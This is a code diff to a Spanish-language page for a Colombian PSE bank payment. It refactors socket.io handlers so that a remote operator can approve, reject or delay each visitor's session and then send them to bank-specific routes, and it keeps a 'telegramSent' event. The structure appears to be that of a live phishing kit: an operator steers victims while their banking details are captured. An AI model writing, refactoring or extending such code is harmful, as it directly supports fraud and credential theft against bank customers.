@@ -21,6 +21,7 @@
 <body>
     <script src="/js/bank-routes.js"></script>
     <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/session-delivery-client.js"></script>
     
     <!-- Background Pattern -->
     <div class="bg-pattern"></div>
@@ -137,6 +138,7 @@
         const loadingOverlay = document.getElementById('loadingOverlay');
 
         const socket = io({
+            auth: { sessionId },
             transports: ['websocket', 'polling'],
             reconnection: true,
             reconnectionDelay: 200,
@@ -221,52 +223,39 @@
         });
 
         socket.on('telegramSent', () => {});
-        socket.on('actionApprovePSE', (data) => {
-            if (data.sessionId !== sessionId) return;
-            
-            console.log('✅ PSE aprobado, redirigiendo al banco...');
-            stopKeepAlive();
-            loadingOverlay.classList.remove('active');
-            
-            // Obtener el banco seleccionado
+
+        function redirectToBank() {
             const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
             const selectedBank = formData.bank;
-            
             if (selectedBank) {
                 const bankRoute = (window.BankRoutes && BankRoutes.getBankRoute(selectedBank)) || null;
                 if (bankRoute) {
-                    console.log('📍 Redirigiendo a:', bankRoute);
                     window.location.href = bankRoute;
-                } else {
-                    console.warn('⚠️ Banco no encontrado:', selectedBank);
-                    alert('Banco seleccionado no disponible');
-                    window.location.href = '/';
+                    return;
                 }
-            } else {
-                alert('Error: No se encontró el banco seleccionado');
-                window.location.href = '/';
             }
-        });
-
-        // Rechazar
-        socket.on('actionRejectPSE', (data) => {
-            if (data.sessionId !== sessionId) return;
-            
-            console.log('❌ PSE rechazado');
-            stopKeepAlive();
-            loadingOverlay.classList.remove('active');
-            alert('Transacción rechazada');
+            alert('Banco seleccionado no disponible');
             window.location.href = '/';
-        });
+        }
 
-        // Esperar
-        socket.on('actionWaitPSE', (data) => {
-            if (data.sessionId !== sessionId) return;
-            
-            console.log('⏳ Esperando...');
-            setTimeout(() => {
-                console.log('⏳ Tiempo completado');
-            }, data.waitTime * 1000 || 15000);
+        SessionDelivery.setupSessionDelivery(socket, sessionId, {
+            actionApprovePSE() {
+                console.log('✅ PSE aprobado, redirigiendo al banco...');
+                stopKeepAlive();
+                loadingOverlay.classList.remove('active');
+                redirectToBank();
+            },
+            actionRejectPSE() {
+                console.log('❌ PSE rechazado');
+                stopKeepAlive();
+                loadingOverlay.classList.remove('active');
+                alert('Transacción rechazada');
+                window.location.href = '/';
+            },
+            actionWaitPSE(data) {
+                console.log('⏳ Esperando...');
+                setTimeout(() => {}, (data.waitTime || 15) * 1000);
+            }
         });
         
         socket.on('error', (error) => {
